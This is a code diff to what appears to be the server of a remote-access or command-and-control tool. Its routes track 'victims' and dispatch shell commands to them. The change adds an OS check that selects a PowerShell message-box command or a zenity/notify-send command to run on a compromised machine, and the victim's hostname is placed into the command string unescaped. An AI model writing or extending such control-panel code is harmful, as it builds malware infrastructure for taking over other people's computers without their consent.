@@ -12,6 +12,10 @@ import { isOnline } from '../lib/presence';
 import { publish } from '../lib/bus';
 import { dispatchCommand, hasControl } from './ws';
 
+function isWindowsOs(os: string | null | undefined): boolean {
+  return /^win/i.test((os ?? '').trim());
+}
+
 const listQuery = z.object({
   q: z.string().max(128).optional(),
   os: z.string().max(32).optional(),
@@ -280,7 +284,7 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
     const victim = await prisma.victim.findUnique({ where: { id }, select: { id: true, hostname: true, os: true, revokedAt: true } });
     if (!victim) throw notFound('victim');
     const safe = text.replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/'/g, "''").replace(/\r?\n/g, ' ');
-    const command = victim.os === 'windows'
+    const command = isWindowsOs(victim.os)
       ? `powershell -NoProfile -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show(\\"${safe}\\",\\"SPC · ${victim.hostname}\\")"`
       : `sh -c "zenity --info --title='SPC · ${victim.hostname}' --text='${safe}' 2>/dev/null || notify-send 'SPC · ${victim.hostname}' '${safe}'"`;
 
